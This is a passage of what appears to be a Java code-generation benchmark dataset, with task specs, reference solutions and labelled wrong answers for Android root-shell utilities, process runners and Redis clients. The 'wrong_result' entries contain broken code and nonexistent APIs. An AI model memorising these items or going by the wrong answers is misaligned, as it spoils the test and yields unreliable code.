    "Instruction": "Task Description: Create a Java utility class for executing shell commands with root privileges and handling process execution in Android environments.\n\nClass Description: ShellUtils is a utility class designed to execute shell commands, particularly in rooted Android environments. It provides methods for finding system binaries, executing commands with or without root privileges, and handling process input/output streams. The class includes functionality for environment variable handling and process synchronization.\n\nAttributes:\n\nBINARY_PLACES: String[] - Array of common binary directories in Android systems for command lookup\nPYTHON_HOME: String - Path to Python installation directory\nDATA_DIR: File - Application data directory\nBUSYBOX_FILE: File - Path to busybox binary\nIS_ROOTED: Boolean - Cached flag indicating whether the device is rooted\n\nMethods:\n\nexecuteNoWait: executeNoWait(Map<String, String> env, String... command) -> Process - Executes a command without waiting for completion, with optional environment variables\nsudoNoWait: sudoNoWait(Map<String, String> env, String... command) -> Process - Executes a command with root privileges (using su) without waiting for completion\nwaitFor: waitFor(String command, Process process) -> String - Waits for process completion and returns output, throws exception if process fails\nfindCommand: findCommand(String command) -> String - Searches for a command in common binary directories and returns full path if found",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\n\npublic class ShellUtils {\n    private final static String[] BINARY_PLACES = {\"/data/bin/\", \"/system/bin/\", \"/system/xbin/\", \"/sbin/\",\n            \"/data/local/xbin/\", \"/data/local/bin/\", \"/system/sd/xbin/\", \"/system/bin/failsafe/\",\n            \"/data/local/\"};\n    private final static String PYTHON_HOME = \"/data/data/fq.router2/python\";\n    public static File DATA_DIR = new File(\"/data/data/fq.router2\");\n    public static File BUSYBOX_FILE = new File(DATA_DIR, \"busybox\");\n    private static Boolean IS_ROOTED = null;\n\n    public static Process executeNoWait(Map<String, String> env, String... command) throws IOException {\n        List<String> envp = new ArrayList<String>();\n        for (Map.Entry<String, String> entry : env.entrySet()) {\n            envp.add(entry.getKey() + \"=\" + entry.getValue());\n        }\n        return Runtime.getRuntime().exec(command, envp.toArray(new String[envp.size()]));\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) throws Exception {\n        if (Boolean.FALSE.equals(IS_ROOTED)) {\n            return executeNoWait(env, command);\n        }\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        Process process = processBuilder\n                .command(findCommand(\"su\"))\n                .redirectErrorStream(true)\n                .start();\n        OutputStreamWriter stdin = new OutputStreamWriter(process.getOutputStream());\n        try {\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                stdin.write(entry.getKey());\n                stdin.write(\"=\");\n                stdin.write(entry.getValue());\n                stdin.write(\" \");\n            }\n            for (String c : command) {\n                stdin.write(c);\n                stdin.write(\" \");\n            }\n            stdin.write(\"\\nexit\\n\");\n        } finally {\n            stdin.close();\n        }\n        return process;\n    }\n\n    public static String waitFor(String command, Process process) throws Exception {\n        BufferedReader stdout = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        StringBuilder output = new StringBuilder();\n        try {\n            String line;\n            while (null != (line = stdout.readLine())) {\n                output.append(line);\n                output.append(\"\\n\");\n            }\n        } finally {\n            stdout.close();\n        }\n        process.waitFor();\n        int exitValue = process.exitValue();\n        if (0 != exitValue) {\n            throw new Exception(\"failed to execute: \" + command + \", exit value: \" + exitValue + \", output: \" + output);\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String binaryPlace : BINARY_PLACES) {\n            String path = binaryPlace + command;\n            if (new File(path).exists()) {\n                return path;\n            }\n        }\n        return command;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellUtils {\n    private static final String[] BINARY_PLACES = {\n        \"/system/bin\",\n        \"/system/xbin\",\n        \"/data/local/bin\",\n        \"/sbin\",\n        \"/usr/bin\"\n    };\n    private static final String PYTHON_HOME = \"/system/bin/python\";\n    private static final File DATA_DIR = new File(\"/data/data/com.example.app\");\n    private static final File BUSYBOX_FILE;\n    private static boolean IS_ROOTED;\n\n    static {\n        IS_ROOTED = checkRoot();\n        BUSYBOX_FILE = new File(findCommand(\"busybox\"));\n    }\n\n    private static boolean checkRoot() {\n        try {\n            Process process = Runtime.getRuntime().exec(\"su\");\n            process.waitFor();\n            return process.exitValue() == 0;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    private static String findCommand(String command) {\n        for (String dir : BINARY_PLACES) {\n            File file = new File(dir, command);\n            if (file.exists() && file.isFile() && file.canExecute()) {\n                return file.getAbsolutePath();\n            }\n        }\n        return null;\n    }\n\n    public static Process executeNoWait(Map<String, String> env, String... command) {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        pb.environment().putAll(env);\n        try {\n            return pb.start();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to start process\", e);\n        }\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) {\n        String joinedCommand = String.join(\" \", command);\n        ProcessBuilder pb = new ProcessBuilder(\"su\", \"-c\", joinedCommand);\n        pb.environment().putAll(env);\n        try {\n            return pb.start();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to start su process\", e);\n        }\n    }\n\n    public static String waitFor(String command, Process process) throws IOException, InterruptedException {\n        StringBuilder output = new StringBuilder();\n        StringBuilder error = new StringBuilder();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n        while ((line = errReader.readLine()) != null) {\n            error.append(line).append(\"\\n\");\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed: \" + command + \". Exit code: \" + exitCode + \". Error output: \" + error.toString());\n        }\n        return output.toString();\n    }\n}"
  },
  {
    "Task_id": 302,
    "Instruction": "Task Description: Create a Java class that handles process execution, logging, and management, with support for both regular and root-level execution on Android systems.\n\nClass Description: ProcessHandler is a utility class designed to manage external process execution in Android applications. It provides functionality to launch processes (with optional root privileges), capture and log their output, and retrieve process information. The class handles environment variables, stream management, and maintains a wake lock during process execution to prevent CPU sleep.\n\nAttributes:\n- mContext: [Context] - Android application context used for system services\n- mUseRoot: [boolean] - Flag indicating whether root privileges should be used\n- mPreferences: [SharedPreferences] - Shared preferences for configuration\n\nMethods:\n- setupAndLaunch([HashMap<String, String> env, String[] command]) -> [Process] - Configures and starts a process with the given environment variables and command, supporting both regular and root execution\n- log([InputStream is, int priority]) -> [Thread] - Starts a thread to continuously read and log input from the given stream at the specified log priority\n- runProcess([ProcessBuilder pb, boolean returnStdOut]) -> [String] - Executes a process, optionally capturing its standard output, while maintaining a wake lock and logging output\n- getProcessPIDs([String processName]) -> [List<String>] - Returns a list of process IDs matching the given process name, supporting both regular and root-level process listing",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.os.PowerManager;\nimport android.util.Log;\n\nimport com.google.common.base.Charsets;\nimport com.nutomic.syncthingandroid.service.Constants;\nimport com.nutomic.syncthingandroid.util.Util;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.inject.Inject;\n\nimport eu.chainfire.libsuperuser.Shell;\n\npublic class ProcessHandler {\n\n    private static final String TAG = \"ProcessHandler\";\n    private final Context mContext;\n    private final boolean mUseRoot;\n    @Inject SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context) {\n        mContext = context;\n        mUseRoot = mPreferences.getBoolean(Constants.PREF_USE_ROOT, false) && Shell.SU.available();\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) throws IOException {\n        if (mUseRoot) {\n            ProcessBuilder pb = new ProcessBuilder(\"su\");\n            Process process = pb.start();\n            DataOutputStream suOut = new DataOutputStream(process.getOutputStream());\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                suOut.writeBytes(String.format(\"export %s=\\\"%s\\\"\\n\", entry.getKey(), entry.getValue()));\n            }\n            suOut.flush();\n            suOut.writeBytes(\"exec \" + TextUtils.join(\" \", command) + \"\\n\");\n            suOut.flush();\n            return process;\n        } else {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.environment().putAll(env);\n            return pb.start();\n        }\n    }\n\n    public Thread log(final InputStream is, final int priority) {\n        Thread t = new Thread(() -> {\n            BufferedReader br = null;\n            try {\n                br = new BufferedReader(new InputStreamReader(is, Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(priority, TAG, line);\n                }\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to read process output\", e);\n            } finally {\n                if (br != null) {\n                    try {\n                        br.close();\n                    } catch (IOException e) {\n                        Log.w(TAG, \"Failed to close bufferedReader\", e);\n                    }\n                }\n            }\n        });\n        t.start();\n        return t;\n    }\n\n    @SuppressLint(\"WakelockTimeout\")\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        String capturedStdOut = \"\";\n        PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);\n        try {\n            wakeLock.acquire();\n            Process process = pb.start();\n\n            Thread lInfo = null;\n            Thread lWarn = null;\n            if (returnStdOut) {\n                BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(Log.INFO, TAG, line);\n                    capturedStdOut = capturedStdOut + line + \"\\n\";\n                }\n                br.close();\n            } else {\n                lInfo = log(process.getInputStream(), Log.INFO);\n                lWarn = log(process.getErrorStream(), Log.WARN);\n            }\n\n            int ret = process.waitFor();\n            Log.i(TAG, \"Process exited with code \" + ret);\n            if (lInfo != null) lInfo.join();\n            if (lWarn != null) lWarn.join();\n        } catch (IOException | InterruptedException e) {\n            Log.e(TAG, \"Failed to execute process or read output\", e);\n        } finally {\n            wakeLock.release();\n        }\n        return capturedStdOut;\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        Process ps = null;\n        DataOutputStream psOut = null;\n        BufferedReader br = null;\n        try {\n            ps = Runtime.getRuntime().exec((mUseRoot) ? \"su\" : \"sh\");\n            psOut = new DataOutputStream(ps.getOutputStream());\n            psOut.writeBytes(\"ps\\n\");\n            psOut.writeBytes(\"exit\\n\");\n            psOut.flush();\n            ps.waitFor();\n            br = new BufferedReader(new InputStreamReader(ps.getInputStream(), \"UTF-8\"));\n            String line;\n            while ((line = br.readLine()) != null) {\n                if (line.contains(processName)) {\n                    String pid = line.trim().split(\"\\\\s+\")[1];\n                    Log.v(TAG, \"getProcessPIDs: Found process PID [\" + pid + \"]\");\n                    pids.add(pid);\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            Log.w(TAG, \"Failed to list processes\", e);\n        } finally {\n            try {\n                if (br != null) br.close();\n                if (psOut != null) psOut.close();\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to close streams\", e);\n            }\n            if (ps != null) ps.destroy();\n        }\n        return pids;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessHandler {\n    private Context mContext;\n    private boolean mUseRoot;\n    private SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context, boolean useRoot, SharedPreferences preferences) {\n        mContext = context;\n        mUseRoot = useRoot;\n        mPreferences = preferences;\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        pb.environment().putAll(env);\n        try {\n            Process process;\n            if (mUseRoot) {\n                String commandStr = String.join(\" \", command);\n                String[] rootCommand = {\"su\", \"-c\", commandStr};\n                pb = new ProcessBuilder(rootCommand);\n            }\n            process = pb.start();\n            return process;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private Thread log(InputStream is, int priority) {\n        return new Thread(() -> {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Log.println(priority, \"ProcessHandler\", line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        PowerManager powerManager = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"ProcessHandler\");\n        wakeLock.acquire();\n\n        try {\n            Process process = pb.start();\n            StringBuilder output = new StringBuilder();\n            Thread stdoutThread = new Thread(() -> {\n                try {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(line).append(\"\\n\");\n                        Log.println(Log.INFO, \"ProcessHandler\", line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            Thread stderrThread = new Thread(() -> {\n                try {\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(line).append(\"\\n\");\n                        Log.println(Log.WARN, \"ProcessHandler\", line);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            stdoutThread.start();\n            stderrThread.start();\n\n            int exitCode = process.waitFor();\n            stdoutThread.join();\n            stderrThread.join();\n\n            if (returnStdOut) {\n                return output.toString();\n            } else {\n                return null;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            wakeLock.release();\n        }\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        String command = \"ps -A\";\n        if (mUseRoot) {\n            command = \"su -c 'ps -A'\";\n        }\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(processName)) {\n                    String[] parts = line.split(\"\\\\s+\");\n                    if (parts.length > 0) {\n                        pids.add(parts[0]);\n                    }\n                }\n            }\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return pids;\n    }\n}"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Java class that manages the execution of external commands, handles their input/output streams, and provides synchronization capabilities for waiting until the command completes.\n\nClass Description: The ExtCmd class provides functionality to execute external system commands, manage their input/output streams, and wait for their completion. It includes features for logging, condition checking before execution, and notification listeners for process completion.\n\nAttributes:\n\nconditionsWithDescriptions: Map<ExtCmdCondition, String> - Stores conditions that must be met before command execution along with their descriptions\nextCmdEndedListenerSet: Set<ExtCmdEndedListener> - Collection of listeners to be notified when command execution ends\noutReceiver: OutputReceiver - Handles the standard output stream from the executed command\nerrReceiver: OutputReceiver - Handles the error output stream from the executed command\nerrLog: ErrorReporter - Logger for command execution information\nstartTime: long - Timestamp when command execution started\nexecCommand: String[] - The command to be executed\nexecCommandStr: String - String representation of the command\nlogExecution: boolean - Flag to enable/disable execution logging\n\nMethods:\n\nexec(ProcessBuilder.Redirect, File, String...) -> OutputStream - Executes an external command with specified input redirection, working directory, and command arguments. Returns the process's output stream for writing input.\nsyncProcess() -> OutputData - Waits for the command to complete and returns its output data including stdout, stderr, and exit code.\ncheckForConditions() -> void - Internal method to verify all execution conditions are met before starting a command.\n\nNested Classes:\n\nOutputData: Contains the results of command execution including stdout, stderr, and exit code\nExtCmdCondition: Interface for defining pre-execution conditions\nExtCmdEndedListener: Interface for command completion notification callbacks",
    "Canonical_solution": "import com.linbit.ChildProcessTimeoutException;\nimport com.linbit.linstor.logging.ErrorReporter;\nimport com.linbit.timer.Action;\nimport com.linbit.timer.Timer;\nimport com.linbit.utils.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\nimport org.slf4j.MDC;\n\npublic class ExtCmd extends ChildProcessHandler\n{\n    private final Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private final Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n\n    private String[] execCommand;\n    private String execCommandStr;\n\n    private boolean logExecution = true;\n\n    public ExtCmd(Timer<String, Action<String>> timer, ErrorReporter errLogRef)\n    {\n        super(timer);\n        conditionsWithDescriptions = new HashMap<>();\n        outReceiver = null;\n        errReceiver = null;\n        errLog = errLogRef;\n        extCmdEndedListenerSet = new HashSet<>();\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect stdinRedirect, File directory, String... command)\n        throws IOException\n    {\n        execCommand = command;\n        execCommandStr = StringUtils.joinShellQuote(command);\n\n        if (logExecution)\n        {\n            errLog.logDebug(\"Executing command: %s\", execCommandStr);\n        }\n\n        ProcessBuilder pBuilder = new ProcessBuilder();\n        pBuilder.directory(directory);\n        pBuilder.command(command);\n        pBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectInput(stdinRedirect);\n        Process child;\n        synchronized (conditionsWithDescriptions)\n        {\n            checkForConditions();\n            child = pBuilder.start();\n            startTime = System.currentTimeMillis();\n            setChild(child);\n            outReceiver = new OutputReceiver(\n                child.getInputStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n            errReceiver = new OutputReceiver(\n                child.getErrorStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n        }\n        new Thread(outReceiver).start();\n        new Thread(errReceiver).start();\n\n        return child.getOutputStream();\n    }\n\n    private void checkForConditions()\n    {\n        for (Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet())\n        {\n            if (!entry.getKey().isMet(this))\n            {\n                throw new ExtCmdConditionNotFullfilledException(entry.getValue() + \", command: \" + this.execCommandStr);\n            }\n        }\n    }\n\n    public OutputData syncProcess() throws IOException, ChildProcessTimeoutException\n    {\n        OutputData outData;\n        try\n        {\n            int exitCode = waitFor();\n            outReceiver.finish();\n            errReceiver.finish();\n            outData = new OutputData(\n                execCommand,\n                outReceiver.getData(),\n                errReceiver.getData(),\n                exitCode\n            );\n\n            if (logExecution)\n            {\n                errLog.logTrace(\n                    \"External command finished in %dms: %s\",\n                    (System.currentTimeMillis() - startTime),\n                    execCommandStr\n                );\n            }\n\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this);\n            }\n        }\n        catch (IOException | ChildProcessTimeoutException exc)\n        {\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this, exc);\n            }\n            throw exc;\n        }\n        return outData;\n    }\n\n    public static class OutputData\n    {\n        public final String[] executedCommand;\n        public final byte[] stdoutData;\n        public final byte[] stderrData;\n        public final int exitCode;\n\n        public OutputData(String[] executeCmd, byte[] out, byte[] err, int retCode)\n        {\n            executedCommand = executeCmd;\n            stdoutData = out;\n            stderrData = err;\n            exitCode = retCode;\n        }\n    }\n\n    public interface ExtCmdCondition\n    {\n        boolean isMet(ExtCmd extCmd);\n    }\n\n    public interface ExtCmdEndedListener\n    {\n        void extCmdEnded(ExtCmd extCmd);\n        void extCmdEnded(ExtCmd extCmd, Exception exc);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ExtCmd {\n    private Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n    private OutputReceiver outReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n    private String[] execCommand;\n    private String execCommandStr;\n    private boolean logExecution;\n    private Process process;\n\n    public static class OutputData {\n        public String stdout;\n        public String stderr;\n        public int exitCode;\n    }\n\n    public interface ExtCmdCondition {\n        boolean isConditionMet();\n    }\n\n    public interface ExtCmdEndedListener {\n        void onCommandEnded(OutputData data);\n    }\n\n    public interface OutputReceiver {\n        void receive(String data);\n    }\n\n    public interface ErrorReporter {\n        void reportError(String message);\n    }\n\n    public ExtCmd() {\n        this.conditionsWithDescriptions = new HashMap<>();\n        this.extCmdEndedListenerSet = new HashSet<>();\n        this.logExecution = true;\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect inputRedirect, File workingDir, String... commandArgs) {\n        checkForConditions();\n        this.execCommand = commandArgs;\n        this.execCommandStr = String.join(\" \", commandArgs);\n        if (logExecution) {\n            errLog.reportError(\"Starting command: \" + execCommandStr);\n            startTime = System.currentTimeMillis();\n        }\n        ProcessBuilder pb = new ProcessBuilder(commandArgs);\n        pb.directory(workingDir);\n        pb.redirectInput(inputRedirect);\n        try {\n            process = pb.start();\n        } catch (IOException e) {\n            errLog.reportError(\"Failed to start process: \" + e.getMessage());\n            return null;\n        }\n        Thread stdoutThread = new Thread(() -> {\n            try (InputStream stdout = process.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(stdout))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    outReceiver.receive(line);\n                }\n            } catch (IOException e) {\n                errLog.reportError(\"Error reading stdout: \" + e.getMessage());\n            }\n        });\n        stdoutThread.start();\n        Thread stderrThread = new Thread(() -> {\n            try (InputStream stderr = process.getErrorStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(stderr))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    errLog.reportError(line);\n                }\n            } catch (IOException e) {\n                errLog.reportError(\"Error reading stderr: \" + e.getMessage());\n            }\n        });\n        stderrThread.start();\n        return process.getOutputStream();\n    }\n\n    public OutputData syncProcess() {\n        try {\n            int exitCode = process.waitFor();\n            OutputData data = new OutputData();\n            data.exitCode = exitCode;\n            stdoutThread.join();\n            stderrThread.join();\n            return data;\n        } catch (InterruptedException e) {\n            errLog.reportError(\"Sync process interrupted: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    private void checkForConditions() {\n        for (ExtCmdCondition condition : conditionsWithDescriptions.keySet()) {\n            if (!condition.isConditionMet()) {\n                errLog.reportError(\"Condition failed: \" + conditionsWithDescriptions.get(condition));\n                throw new RuntimeException(\"Condition failed: \" + conditionsWithDescriptions.get(condition));\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: Create a Java class that implements a Redis publisher using the Lettuce client library, capable of publishing elements to a Redis list and providing a reactive stream publisher for consuming these elements.\n\nClass Description: The RedisPublisher class provides functionality to connect to a Redis server, publish elements to a Redis list, and create a reactive stream publisher for these elements. It handles connection management and resource cleanup.\n\nAttributes:\n- client: [RedisClient] - The Redis client instance used to establish connections with the Redis server.\n- connection: [StatefulRedisConnection<String, String>] - The active connection to the Redis server for executing commands.\n\nMethods:\n- RedisPublisher() - [Constructor] -> [void] - Initializes the Redis client and establishes a connection to the Redis server. Also flushes all existing data in Redis.\n- createPublisher(long elements) -> [Publisher<String>] - Creates and returns a reactive stream Publisher that emits elements from a Redis list. The method creates a new Redis list with the specified number of elements and sets up a supplier for LRANGE commands to retrieve them.\n- close() -> [void] - Closes the Redis connection and shuts down the client to release resources.\n\nInput: \n- For createPublisher: elements [long] - The number of elements to publish to the Redis list.\n\nOutput:\n- For createPublisher: A Publisher<String> that emits the elements from the Redis list. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.output.ValueListOutput;\nimport io.lettuce.core.protocol.Command;\nimport io.lettuce.core.protocol.CommandArgs;\nimport io.lettuce.core.protocol.CommandType;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.List;\nimport java.util.UUID;\nimport java.util.function.Supplier;\n\npublic class RedisPublisher {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        String id = UUID.randomUUID().toString();\n        String key = \"PublisherVerification-\" + id;\n\n        for (int i = 0; i < elements; i++) {\n            sync.lpush(key, \"element-\" + i);\n        }\n\n        Supplier<Command<String, String, List<String>>> supplier = () -> {\n            CommandArgs<String, String> args = new CommandArgs<>(StringCodec.UTF8).addKey(key).add(0).add(-1);\n            return new Command<>(CommandType.LRANGE, new ValueListOutput<>(StringCodec.UTF8), args);\n        };\n\n        return new TestRedisPublisher(supplier, connection, true);\n    }\n\n    public void close() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisPublisher {\n    private final RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create(\"redis://localhost:6379\");\n        connection = client.connect();\n        connection.sync().flushDb();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n        List<String> elementList = new ArrayList<>();\n        for (long i = 1; i <= elements; i++) {\n            elementList.add(\"element\" + i);\n        }\n        String listKey = \"myList\";\n        return connection.reactive().listCommands().rightPush(listKey, elementList)\n            .then(connection.reactive().listCommands().range(listKey, 0, -1))\n            .flatMapIterable(list -> list);\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Implement a utility class for Redis pipeline operations using Lettuce client in Java, enabling batch Redis commands execution with asynchronous processing.\n\nClass Description: LettuceRedisUtils is a singleton utility class that provides a method for executing Redis commands in pipeline mode using Lettuce client. It manages Redis connections and asynchronous command execution.\n\nAttributes:\n- REDIS_CLIENT: [RedisClient] - The singleton Redis client instance initialized with connection details (host, port, password)\n\nMethods:\n- pipeline: [pipeline](RedisPipelineCallBack pipelineCallBack) -> [void] - Executes Redis commands in pipeline mode. Takes a callback interface that contains the Redis operations to be performed. Handles connection management, command flushing, and waiting for completion of all operations. The callback should return a list of RedisFuture objects representing the asynchronous operations.",
    "Canonical_solution": "import io.lettuce.core.LettuceFutures;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisFuture;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\n\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\npublic class LettuceRedisUtils {\n\n    private static final RedisClient REDIS_CLIENT;\n\n    static {\n        RedisURI redisUri = RedisURI.Builder.redis(AustinFlinkConstant.REDIS_IP)\n                .withPort(Integer.parseInt(AustinFlinkConstant.REDIS_PORT))\n                .withPassword(AustinFlinkConstant.REDIS_PASSWORD.toCharArray())\n                .build();\n        REDIS_CLIENT = RedisClient.create(redisUri);\n    }\n\n    private LettuceRedisUtils() {\n    }\n\n    public static void pipeline(RedisPipelineCallBack pipelineCallBack) {\n        StatefulRedisConnection<byte[], byte[]> connect = REDIS_CLIENT.connect(new ByteArrayCodec());\n        RedisAsyncCommands<byte[], byte[]> commands = connect.async();\n\n        List<RedisFuture<?>> futures = pipelineCallBack.invoke(commands);\n\n        commands.flushCommands();\n        LettuceFutures.awaitAll(10, TimeUnit.SECONDS,\n                futures.toArray(new RedisFuture[0]));\n        connect.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class LettuceRedisUtils {\n    private static final LettuceRedisUtils INSTANCE = new LettuceRedisUtils();\n    private static final RedisClient REDIS_CLIENT;\n\n    private LettuceRedisUtils() {\n        REDIS_CLIENT = RedisClient.create(\"redis://host:port?password=pass\");\n    }\n\n    public static LettuceRedisUtils getInstance() {\n        return INSTANCE;\n    }\n\n    public void pipeline(RedisPipelineCallBack callback) {\n        RedisConnection<String, String> connection = REDIS_CLIENT.connect();\n        RedisPipeline pipeline = connection.getPipeline();\n        List<RedisFuture<?>> futures = callback.execute(pipeline);\n        pipeline.flush();\n        for (RedisFuture<?> future : futures) {\n            try {\n                future.get();\n            } catch (Exception e) {\n                // Handle exception\n            }\n        }\n        connection.close();\n    }\n}\n\npublic interface RedisPipelineCallBack {\n    List<RedisFuture<?>> execute(RedisPipeline pipeline);\n}"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing methods to establish, close, and create new connections with configurable protocols.\n\nClass Description: The RedisConnectionManager class handles Redis connection management using Jedis, allowing for protocol configuration and providing essential connection operations. It encapsulates connection details and offers methods for connection lifecycle management.\n\nAttributes:\n\nendpoint: [EndpointConfig] - Configuration for Redis connection endpoint (host, port, etc.)\nprotocol: [RedisProtocol] - The Redis protocol to be used for connections\njedis: [Jedis] - The Jedis client instance for Redis operations\n\nMethods:\n\nsetUpConnection: [void]() -> [void] - Establishes a new Redis connection with the configured protocol and timeout, and flushes all existing data\ncloseConnection: [void]() -> [void] - Closes the current Redis connection and releases resources\ncreateNewConnection: [Jedis]() -> [Jedis] - Creates and returns a new Jedis connection instance with the configured protocol",
